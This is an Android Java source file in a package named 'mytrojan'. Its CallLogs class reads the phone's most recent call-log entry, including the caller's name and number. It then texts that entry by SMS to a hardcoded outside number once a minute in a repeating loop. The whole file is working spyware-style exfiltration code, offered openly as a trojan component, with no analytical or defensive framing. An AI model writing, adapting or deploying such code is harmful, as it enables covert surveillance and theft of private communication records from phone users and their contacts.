package com.example.mytrojan;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import android.os.Handler;
import android.telephony.SmsManager;

public class CallLogs {
    private Context ctx;

    public CallLogs(Context ctx) {
        this.ctx = ctx;
    }



    private String getLastCallLog() {

        // Get the last call from the call log and send a message to them.
        String[] strFields = { android.provider.CallLog.Calls.NUMBER,
                android.provider.CallLog.Calls.CACHED_NAME, };

        //reading all data in descending order according to DATE
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        Uri callUri = Uri.parse("content://call_log/calls");
        Cursor cur = this.ctx.getContentResolver().query(callUri, strFields, null, null, strOrder);
        cur.moveToFirst();

        String callNumber = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NUMBER));
        String callName = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));
        if (callName == null) {
            callName = "";
        }

        String message = callName + ' ' + callNumber;

        // process log data...
        return message;

    }

    private final static int INTERVAL = 1000 * 1 * 60; // 1 minute;
    Handler mHandler = new Handler();

    Runnable mHandlerTask = new Runnable()
    {
        @Override
        public void run() {
            sendSMS();
            mHandler.postDelayed(mHandlerTask, INTERVAL);
        }
    };

    void startRepeatingTask()
    {
        mHandlerTask.run();
    }

    void stopRepeatingTask()
    {
        mHandler.removeCallbacks(mHandlerTask);
    }

    void sendSMS() {

        String messageToSend = getLastCallLog();
        String number = "4121234567";

        SmsManager.getDefault().sendTextMessage(number, null, messageToSend, null,null);
    }
}
